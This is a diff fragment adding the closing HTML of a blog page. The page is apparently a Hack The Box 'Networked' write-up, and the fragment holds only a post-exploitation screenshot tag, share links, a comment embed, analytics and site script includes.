+  <img src="/assets/hackthebox/networked/networked-11-81c67eb8b31320a0c933de237a0f096a35ddacfa2beda5ee21408d387294c615.png" alt="Networked Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/networked/networked-11-81c67eb8b31320a0c933de237a0f096a35ddacfa2beda5ee21408d387294c615.png" data-zooming-width="405" data-zooming-height="294">
+</a></p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Networked+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/networked%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewbox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"></path></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/networked" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewbox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"></path></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
